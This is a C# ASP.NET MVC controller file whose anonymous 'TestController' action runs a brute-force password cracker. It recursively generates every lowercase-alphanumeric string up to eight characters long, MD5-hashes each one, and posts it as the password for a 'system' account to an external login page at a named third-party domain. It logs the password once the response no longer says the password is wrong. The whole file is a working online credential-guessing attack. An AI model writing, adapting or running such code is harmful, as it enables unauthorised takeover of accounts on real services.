using IMS.Common;
using log4net;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Web.Mvc;

namespace IMS.Web.Controllers
{
    public class TestController : Controller
    {
        private static ILog log = LogManager.GetLogger(typeof(UserController));
        [AllowAnonymous]
        public async Task<ActionResult> Index()
        {
            HttpClient client = new HttpClient();
            int maxLength = 8; //设置可能最长的密码长度  
            await Password.CrackPass(maxLength, client);
            return Content("ok");
        }

        public class Parm
        {
            public string email { get; set; } = "system";
            public string password { get; set; }
        }

        public class Password
        {
            //密码可能会包含的字符集合          
            //
            static char[] charSource = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',  'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
            //static char[] charSource = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};        
            static int sLength = charSource.Length; //字符集长度          
                                                    //得到密码长度从 1到maxLength的所有不同长的密码集合          
            public static async Task CrackPass(int maxLength,HttpClient client)
            {
                for (int i = 1; i <= maxLength; i++)
                {
                    char[] list = new char[i];
                    await Crack(list, i,client);
                }
            }
            //得到长度为len所有的密码组合，在字符集charSource中          
            //递归表达式：fn(n)=fn(n-1)*sLenght; 大致是这个意思吧          
            private static async Task Crack(char[] list, int len,HttpClient client)
            {
                if (len == 0)
                {
                    //递归出口，list char[] 转换为字符串，并打印                  
                    string password = ArrayToString(list);
                    Parm parm = new Parm();
                    parm.password = CommonHelper.GetMD5ToLower(password);
                    var res = await HttpClientHelper.GetResponseByPostAsync(client, parm, "http://vip.laiwan4.club/user-login.htm");
                    if (!res.Contains("密码错误"))
                    {
                        log.Debug($"获取system的密码成功，密码是：{password}");
                    }
                }
                else
                {
                    for (int i = 0; i < sLength; i++)
                    {
                        list[len - 1] = charSource[i];
                        await Crack(list, len - 1,client);
                    }
                }
            }
            //list char[] 转换为字符串         
            private static String ArrayToString(char[] list)
            {
                if (list == null || list.Length == 0)
                    return "";
                StringBuilder buider = new StringBuilder(list.Length * 2);
                for (int i = 0; i < list.Length; i++)
                {
                    buider.Append(list[i]);
                }
                return buider.ToString();
            }
        }
    }
}